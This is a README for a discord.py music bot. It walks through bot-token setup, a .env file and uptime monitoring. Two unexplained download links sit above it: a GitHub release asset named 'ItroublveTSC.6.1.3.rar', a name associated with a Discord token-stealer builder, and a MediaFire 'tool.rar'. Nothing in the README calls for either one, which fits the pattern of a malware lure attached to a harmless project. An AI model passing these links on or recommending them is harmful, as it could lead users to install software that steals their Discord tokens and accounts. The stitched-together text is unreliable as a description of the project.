https://objects.githubusercontent.com/github-production-release-asset-2e65be/453491470/32eb0298-d9e2-43eb-9557-589a558f8e56?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20220522%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220522T113602Z&X-Amz-Expires=300&X-Amz-Signature=fe9b5c10e0a5355a760c5e975ebc07523353c4a4d65f724c59cbf6da310f4e30&X-Amz-SignedHeaders=host&actor_id=80380401&key_id=0&repo_id=453491470&response-content-disposition=attachment%3B%20filename%3DItroublveTSC.6.1.3.rar&response-content-type=application%2Foctet-stream

https://download2266.mediafire.com/aqlj2sxo6ryg/qbxo680npjooihm/tool.rar

# Discord.py Music Bot

A simple music bot written in discord.py using youtube-dl. Use this as an example or a base for your own bot and extend it as you want. 

Adapted from this [gist](https://gist.github.com/vbe0201/ade9b80f2d3b64643d854938d40a0a2d), Copyright (c) 2019 Valentin B.

### Pre-Setup

If you don't already have a discord bot, click [here](https://discordapp.com/developers/), accept any prompts then click "New Application" at the top right of the screen.  Enter the name of your bot then click accept.  Click on Bot from the panel from the left, then click "Add Bot."  When the prompt appears, click "Yes, do it!" 
![Left panel](https://i.imgur.com/hECJYWK.png)

Then, click copy under token to get your bot's token. Your bot's icon can also be changed by uploading an image.

![Bot token area](https://i.imgur.com/da0ktMC.png)

### Setup

Create a file named `.env`

Add `TOKEN=<your bot token>`

Your .env file should look something like this:

```
TOKEN=<Bot token>
```

### Uptime

To keep your bot alive you need to make this repl into a webserver. The way you do that is that you `import keep_alive` (file included this repl) and call it `keep_alive()`.

Now that this repl is a server, all you have to do to keep your bot up is setup something to ping the site your bot made every 5 minutes or so.

Go to [uptimerobot.com](https://uptimerobot.com/) and create an accout if you dont have one.  After verifying your account, click "Add New Monitor".

+ For Monitor Type select "HTTP(s)"
+ In Friendly Name put the name of your bot
+ For your url, put the url of the website made for your repl.
+ Select any alert contacts you want, then click "Create Monitor" 
![Uptime robot example](https://i.imgur.com/Qd9LXEy.png)

Your bot should now be good to go, with near 100% uptime.

